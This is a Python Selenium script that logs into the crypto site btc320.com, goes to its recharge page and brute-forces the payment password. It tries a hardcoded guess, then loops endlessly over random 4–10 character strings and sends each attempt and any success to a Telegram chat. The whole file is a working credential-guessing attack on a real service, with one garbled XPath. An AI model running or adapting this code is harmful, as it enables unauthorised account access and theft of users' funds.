import os
import time
import random
import string
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException
import telebot

# Environment variables
USERNAME = os.getenv("USERNAME")
PASSWORD = os.getenv("PASSWORD")
BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")
FILTERED_CHAT_ID = os.getenv("FILTERED_CHAT_ID")

# Fixed password try first
fixed_password = "Btc658"

# Selenium setup
options = Options()
options.add_argument("--headless")
options.add_argument("--no-sandbox")
options.add_argument("--disable-dev-shm-usage")
driver = webdriver.Chrome(options=options)

bot = telebot.TeleBot(BOT_TOKEN)

def send_log(message, filtered=False):
    bot.send_message(CHAT_ID, message)
    if filtered:
        bot.send_message(FILTERED_CHAT_ID, message)

def login():
    driver.get("https://www.btc320.com/pages/user/other/userLogin")
    time.sleep(3)
    try:
        driver.find_element(By.XPATH, '//*[@id="app"]/uni-app/uni-page/uni-page-wrapper/uni-page-body/uni-view/uni-view[4]/uni-view/uni-view[2]/uni-view/uni-input/div/input').send_keys(USERNAME)
        driver.find_element(By.XPATH, '//*[@id="app"]/uni-app/uni-page/uni-page-wrapper/uni-page-body/uni-view/uni-view[5]/uni-view[1]/uni-view/uni-view/uni-input/div/input').send_keys(PASSWORD)
        driver.find_element(By.XPATH, '//*[@id="app"]/uni-app/uni-page/uni-page-wrapper/uni-page-body/uni-view/uni-view[6]/uni-button').click()
        time.sleep(5)
        send_log("Login success")
    except Exception as e:
        send_log(f"Login failed: {str(e)}")

def navigate_to_recharge():
    driver.get("https://www.btc320.com/pages/user/recharge/userRecharge")
    time.sleep(5)
    send_log("Navigated to recharge page")

def generate_password(length=6):
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))

def try_password(password):
    try:
        driver.find_element(By.XPATH, '//*[@id="app"]/uni-app/uni-page/uni-page-wrapper/uni-page-body/uni-view/uni-view[3]/uni-view[5]/uni-view/uni-view/uni-input/div/input').clear()
        driver.find_element(By.XPATH, '//*[@id="app"]/uni-app/uni-page/uni-page-wrapper/uni-page-body/uni-view/uni-view[3]/uni-view[5]/uni-view/uni-view/uni-input/div/input').send_keys("10")

        driver.find_element(By.XPATH, '//*[@id="app"]/uni-app/uni-page/uni-page-wrapper/uni-page-body/uni-view/uni-view[3]/uni-view[9]/uni-view/uni-view/uni-input/div/input').clear()
        driver.find_element(By.XPATH, '//*[@id="app"]/uni-app/uni-page/uni-page-wrapper/uni-page-body/uni-view/uni-view[3]/uni-view/9]/uni-view/uni-view/uni-input/div/input').send_keys(password)
        send_log(f"Trying password: {password}")

        driver.find_element(By.XPATH, '//*[@id="app"]/uni-app/uni-page/uni-page-wrapper/uni-page-body/uni-view/uni-view[4]/uni-view/uni-view/uni-button').click()
        time.sleep(5)

        current_url = driver.current_url
        if "userRecharge" not in current_url:
            send_log(f"Correct password found: {password}", filtered=True)
            return True

        try:
            toast = driver.find_element(By.XPATH, '//*[@id="u-a-t"]/uni-toast/div/p').text
            if "incorrect" in toast.lower():
                return False
        except:
            pass

    except Exception as e:
        send_log(f"Error during password try: {str(e)}")
    return False

def main():
    login()
    navigate_to_recharge()
    if try_password(fixed_password):
        return

    while True:
        password = generate_password(random.randint(4, 10))
        if try_password(password):
            break
        time.sleep(5)

if __name__ == "__main__":
    main()